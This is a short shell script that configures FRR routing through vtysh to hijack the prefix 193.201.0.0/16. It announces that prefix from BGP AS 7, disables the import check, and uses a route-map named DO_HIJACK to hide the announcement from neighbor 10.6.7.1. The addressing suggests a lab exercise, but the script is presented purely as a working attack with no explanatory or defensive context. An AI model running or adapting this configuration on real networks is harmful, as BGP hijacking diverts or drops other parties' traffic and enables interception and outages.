#!/bin/bash

ip route add 193.201.0.0/16 via 10.6.7.1

vtysh -c "configure" \
        -c "ip prefix-list HIJACK seq 5 permit 193.201.0.0/16 le 16" \
        -c "route-map DO_HIJACK deny 10" \
        -c "match ip address prefix-list HIJACK" 

vtysh -c "configure" \
        -c "router bgp 7" \
        -c "no bgp network import-check" \
        -c "address-family ipv4 unicast" \
        -c "network 193.201.0.0/16" \
        -c "neighbor 10.6.7.1 route-map DO_HIJACK out"
